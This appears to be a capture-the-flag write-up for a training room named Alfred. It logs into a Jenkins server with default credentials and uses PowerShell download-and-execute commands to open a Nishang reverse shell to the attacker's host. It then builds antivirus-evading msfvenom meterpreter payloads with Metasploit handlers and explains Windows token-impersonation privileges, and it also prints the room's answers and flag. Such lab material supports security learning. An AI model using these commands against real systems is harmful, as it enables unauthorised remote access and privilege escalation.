---
Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
---

# Alfred — Writeup

## Overview
### Alfred — Writeup
### Alfred — Writeup
![](https://i.imgur.com/goE7bn7.png)
In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access.
Since this is a Windows application, we'll be using Nishang to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

## Enumeration
```text
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.41.147  
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 11:47 EDT
Nmap scan report for 10.10.41.147
Host is up (0.20s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
3389/tcp open  tcpwrapped
|_ssl-date: 2022-09-27T15:48:04+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2022-09-26T14:55:40
|_Not valid after:  2023-03-28T14:55:40
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Phone|8.1|Vista (90%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   201.98 ms 10.11.0.1
2   194.40 ms 10.10.41.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.45 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.41.147

http://10.10.41.147:8080/

Default credentials for Jenkins are admin:password but we know here (look at the format of the expected answer) that both the login and the passwords are 5 characters. 

admin:admin

To execute commands via Jenkins, follow these steps:

    Connect with http#58;//10.10.31.231:8080/ using admin:admin
    From the dashboard, click on “project”
    From the menu on the left hand side, click on “Configure”.
    Scroll down to the “Build” section and enter a command (e.g. “ipconfig”)
    Click on the “Save” button
    Back to the Project view, click on “Build now” from the menu on the left hand side
    Wait until you see a new build number (e.g. “#2”) from the “Build history” box under the menu
    Click on the build number that has been added. 9. From the menu, click on “Console output”. From here you will get the result of your command.

Based on this, we will create a reverse shell.

First, download the Invoke-PoweShellTcp.ps1 powershell script and make it available through a web server:
```
```text
┌──(kali㉿kali)-[~]
└─$ mkdir alfred
```
```text
┌──(kali㉿kali)-[~]
└─$ cd alfred
```
```text
┌──(kali㉿kali)-[~/alfred]
└─$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 
--2022-09-27 11:59:54--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4339 (4.2K) [text/plain]
Saving to: ‘Invoke-PowerShellTcp.ps1’

Invoke-PowerShellTcp.ps1 100%[==================================>]   4.24K  --.-KB/s    in 0.001s  

2022-09-27 11:59:54 (8.11 MB/s) - ‘Invoke-PowerShellTcp.ps1’ saved [4339/4339]
```
```text
┌──(kali㉿kali)-[~/alfred]
└─$ ls
Invoke-PowerShellTcp.ps1
```
```text
┌──(kali㉿kali)-[~/alfred]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.41.147 - - [27/Sep/2022 12:02:49] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

in jenkins

powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.81.220:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.81.220 -Port 1337 

revshell
```
```text
┌──(kali㉿kali)-[~/alfred]
└─$ rlwrap nc -nlvp 1337 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.41.147.
Ncat: Connection from 10.10.41.147:49252.
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>ipconfig

Windows IP Configuration

Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::e070:3b61:2d11:260%13
   IPv4 Address. . . . . . . . . . . : 10.10.41.147
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
PS C:\Program Files (x86)\Jenkins\workspace\project> more 'C:\users\bruce\desktop\user.txt'
79007a09481963edf2e1321abd9ae2a0
```
How many ports are open? (TCP only)
*3*
What is the username and password for the log in panel(in the format username:password)
*admin:admin*
![[Pasted image 20220927095714.png]]
![[Pasted image 20220927105933.png]]
![[Pasted image 20220927110310.png]]
![[Pasted image 20220927110338.png]]
What is the user.txt flag?
use nishang to get a reverse shell
*79007a09481963edf2e1321abd9ae2a0*
### Switching Shells
![|333](https://i.imgur.com/c7WqHoH.png)
To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.
Use msfvenom to create the a windows meterpreter reverse shell using the following payload
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.
After creating this payload, download it to the machine using the same method in the previous step:
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
Before running this program, ensure the handler is set up in metasploit:
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
﻿This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell
Start-Process "shell-name.exe"
This should spawn a meterpreter shell for you!

## Exploitation
```text
┌──(kali㉿kali)-[~/alfred]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.81.220 LPORT=1234 -f exe -o nishang.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: nishang.exe
```
What is the final size of the exe payload that you generated?
*73802*

## Privilege Escalation
![|333](https://i.imgur.com/0eEIphY.png)
Now that we have initial access, let's use token impersonation to gain system access.
Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).
This access token consists of:
user SIDs(security identifier)
group SIDs
privileges
amongst other things. More detailed information can be found [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens).
There are two types of access tokens:
primary access tokens: those associated with a user account that are generated on log on
impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process
For an impersonation token, there are different levels:
SecurityAnonymous: current user/client cannot impersonate another user/client
SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
SecurityImpersonation: current user/client can impersonate the client's security context on the local system
SecurityDelegation: current user/client can impersonate the client's security context on a remote system
where the security context is a data structure that contains users' relevant security information.
The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
There's more reading [here](https://www.exploit-db.com/papers/42556).
```text

```
```text
┌──(kali㉿kali)-[~/alfred]
└─$ msfconsole -q
```
```text
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
```text
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```
```text
msf6 exploit(multi/handler) > set LHOST 10.11.81.220
LHOST => 10.11.81.220
```
```text
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
```
```text
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.81.220:1234 
[*] Sending stage (175686 bytes) to 10.10.41.147

in jenkins

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.81.220:1234/nishang.exe','nishang.exe')"

however fails

Let’s use a different approach to directly upload a reverse shell

Let’s rather use exploit/multi/script/web_delivery.
```
```text
┌──(kali㉿kali)-[~/alfred]
└─$ msfconsole -q
```
```text
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
```
```text
msf6 exploit(multi/script/web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```
```text
msf6 exploit(multi/script/web_delivery) > set LHOST 10.11.81.220
LHOST => 10.11.81.220
```
```text
msf6 exploit(multi/script/web_delivery) > set LPORT 1234
LPORT => 1234
```
```text
msf6 exploit(multi/script/web_delivery) > set target PSH
target => PSH
```
```text
msf6 exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must
                                        be an address on the local machine or 0.0.0.0 to listen on
                                        all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly gener
                                       ated)
   URIPATH                   no        The URI to use for this exploit (default is random)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.11.81.220     yes       The listen address (an interface may be specified)
   LPORT     1234             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   2   PSH
